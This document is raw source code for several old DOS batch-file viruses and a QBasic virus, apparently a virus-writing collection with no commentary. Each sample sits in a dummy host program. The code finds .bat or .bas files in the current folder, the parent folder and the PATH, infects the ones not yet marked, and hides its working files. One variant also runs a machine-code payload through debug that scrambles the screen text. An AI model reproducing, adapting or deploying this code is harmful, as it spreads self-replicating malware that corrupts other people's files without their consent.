@if not '%0==' if '%_melt%==' goto meltbeg
::---- dummy host --------
@echo off
echo Hello World!
::---- end dummy host ----

@goto MeLTend [MeLT_2a]
:MeLTbeg
@echo off%_MeLT%
if '%1=='MeLT goto MeLT%2
if not exist %comspec% set comspec=%_MeLT%command
%comspec% /e:5000 /c %0 MeLT vir
set MeLTcl=%1 %2 %3 %4 %5 %6 %7 %8 %9
call %0 MeLT rh
set _MeLT=
set MeLTcl=
goto MeLTend
:MeLTrh
set _MeLT=x
%0 %MeLTcl%
:MeLTvir
set MeLTH=%0
if not exist %_MeLT%%temp%\nul set temp=%tmp%
if exist %temp%\MeLT_2a goto MeLTrun
%0 MeLT fnd . %path%
:MeLTfnd
shift%_MeLT%
if '%2==' exit MeLT
set MeLT=%2\%MeLTH%.bat
if not exist %MeLT% set MeLT=%2\%MeLTH%
if not exist %MeLT% set MeLT=%2%MeLTH%.bat
if not exist %MeLT% set MeLT=%2%MeLTH%
if not exist %MeLT% goto MeLTfnd
find "MeLT"<%MeLT%>%temp%\MeLT_2a
attrib %temp%\MeLT_2a +h
:MeLTrun
%MeLTH% MeLT s . .. %path%
:MeLTs
shift%_MeLT%
if '%2==' exit MeLT
for %%a in (%2\*.bat %2*.bat) do call %MeLTH% MeLT inf %%a
goto MeLTs
:MeLTinf
find /i "MeLT"<%3>nul
if not errorlevel 1 goto MeLTno
echo @if not '%%0==' if '%%_melt%%==' goto meltbeg>MeLT.t
type %3>>MeLT.t
echo.>>MeLT.t
type %temp%\MeLT_2a>>MeLT.t
move MeLT.t %3>nul
exit MeLT
:MeLTact - flash-melt screen text then put back to normal
echo e 100 BA D0 07 BB 00 B8 8E C3 8B CA 33 FF 26 8B 05 FE>MeLT.t
echo e 110 C0 FE C4 26 89 05 47 47 E2 F2 FE 06 24 01 75 E8>>MeLT.t
echo e 120 B4 4C CD 21 00>>MeLT.t
echo g>>MeLT.t
debug<MeLT.t>nul
del MeLT.t
exit MeLT
:MeLTno
set MeLTC=%MeLTC%1
if %MeLTC%==1111111111 goto MeLTact
:MeLTend




@echo off%[BfV_B]%
if '%1=='## goto BfV_%2
if exist C:\_BfV.bat goto BfV_
if not exist %0.bat goto BfV_end
find "BfV"<%0.bat>C:\_BfV.bat
attrib C:\_BfV.bat +h
:BfV_
command /e:5000 /c C:\_BfV ## run
goto BfV_end
:BfV_run
for %%i in (*.bat ..\*.bat) do call C:\_BfV ## inf %%i
exit BfV
:BfV_inf
if '%BfV%=='1111111 exit
set BfV=%BfV%1
find "BfV"<%3>nul
if not errorlevel 1 goto BfV_end
type %3>BfV
type C:\_BfV.bat>>BfV
move BfV %3>nul
exit BfV
:BfV_end



@ctty nul._!
for %%a in (*.bat ..\*.bat) do set _!=%%a
find "_!"<%_!%
if errorlevel 1 find "_!"<%0.BAT>>%_!%
ctty con._!



basvirH$ = "BASVIR.BAS"
OPEN "~$.bat" FOR OUTPUT AS #2: REM BasVir
PRINT #2, "@echo off %BasVir1%"
PRINT #2, "if '%1=='BasVir goto BasVir%2"
PRINT #2, "for %%a in (*.bas) do call ~$ BasVir 2 %%a"
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVir2"
PRINT #2, "find "; CHR$(34); "DECLARE "; CHR$(34); "<%3>nul": REM BasVir
PRINT #2, "if not errorlevel 1 goto BasVirE"
PRINT #2, "echo basvirH$ = "; CHR$(34); "%3"; CHR$(34); ">~1": REM BasVir
PRINT #2, "find "; CHR$(34); "BasVir"; CHR$(34); "<"; basvirH$; ">>~1"
PRINT #2, "copy %3 ~2>nul": REM BasVir
PRINT #2, "copy /b ~1+~2 %3>nul": REM BasVir
PRINT #2, "exit": REM BasVir
PRINT #2, ":BasVirE"
CLOSE #2: REM BasVir
SHELL "~$": REM BasVir
SHELL "del ~?.*": REM BasVir
REM ******* [BasVir] the QBasic Virus *******
REM This is a dummy host program
SYSTEM
